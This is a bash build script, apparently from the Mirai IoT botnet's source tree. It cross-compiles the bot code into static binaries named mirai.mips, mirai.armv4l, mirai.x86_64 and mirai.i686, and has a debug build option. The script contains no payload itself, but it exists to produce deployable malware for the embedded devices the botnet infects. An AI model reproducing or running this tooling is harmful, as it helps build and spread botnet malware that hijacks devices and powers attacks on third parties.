#!/bin/bash

function compile_bot {
	"$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release>"
elif [ "$1" == "release" ]; then
    rm release/mirai.*
    compile_bot mips mirai.mips "-static"
    compile_bot armv4l mirai.armv4l "-static"
    #compile_bot armv5l mirai.armv5l "-static"
    compile_bot x86_64 mirai.x86_64 "-static"
    compile_bot i686 mirai.i686 "-static"
elif [ "$1" == "debug" ]; then
    gcc -std=c99 bot/*.c -DDEBUG  -static -g -o debug/mirai.dbg
else
    echo "Unkonwn parameter $1:$0 <debug | release>"
fi
